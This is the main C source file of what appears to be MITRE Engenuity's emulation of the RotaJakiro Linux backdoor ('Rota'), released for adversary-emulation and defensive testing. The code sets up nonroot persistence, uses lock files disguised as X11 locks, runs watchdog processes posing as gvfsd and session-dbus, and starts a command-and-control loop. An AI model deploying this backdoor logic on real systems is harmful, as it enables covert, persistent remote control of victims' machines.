
# ---------------------------------------------------------------------------
# main.c - Main function for Rota Jakrio "Rota" Implant

 # Copyright 2023 MITRE Engenuity. Approved for public release. Document number CT0005.
 # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

 # http://www.apache.org/licenses/LICENSE-2.0
 # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# MITRE ATT&CK Techniques:
#   T1140 Deobfuscate/Decode Files or Information

# Resources:
#   https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
#   https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/

# Revision History:

# ---------------------------------------------------------------------------

#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
#include <limits.h>
// custom functions
#include "utils.h"
#include "persistence.h"
#include "c2_loop.h"

int main(int argc, char *argv[]) {

    #ifdef DEBUG
    printf("DEBUG MODE ENABLED\n");
    #endif


    nonroot_persistence();

    //if session-dbus lock file is locked... create the lock for gvfsd and spawn gvfsd
    char *home = getenv("HOME");
    char *lock_path = "/.X11/.X11-lock";
    char *lock_path_2 = "/.X11/.X0-lock";
    char *home_lock_path = (char *)malloc(PATH_MAX);
    char *home_lock_path_2 = (char *)malloc(PATH_MAX);

    memset(home_lock_path, 0, PATH_MAX);
    memset(home_lock_path_2, 0, PATH_MAX);

    memcpy(home_lock_path, home, strlen(home));
    memcpy(home_lock_path_2, home, strlen(home));

    strncat(home_lock_path, lock_path, strlen(lock_path));
    strncat(home_lock_path_2, lock_path, strlen(lock_path_2));

    //ex: lock_check("/home/$USER/.X11/.X11-lock")
    if (lock_check(home_lock_path) != 0) {

        create_lock(0);  // lock file created, when gvfspd spawns session-dbus, this loop will run forever.
        spawn_thread_watchdog(0);

        // forever run session-dbus as a secondary "watchdog process".
        do {
            sleep(10);
        }while(true);

    }

    create_lock(1);

     //spawn main "watch dog" process in gvfsd-helper
    spawn_thread_watchdog(1);
    c2_loop();

    return 0;
 }

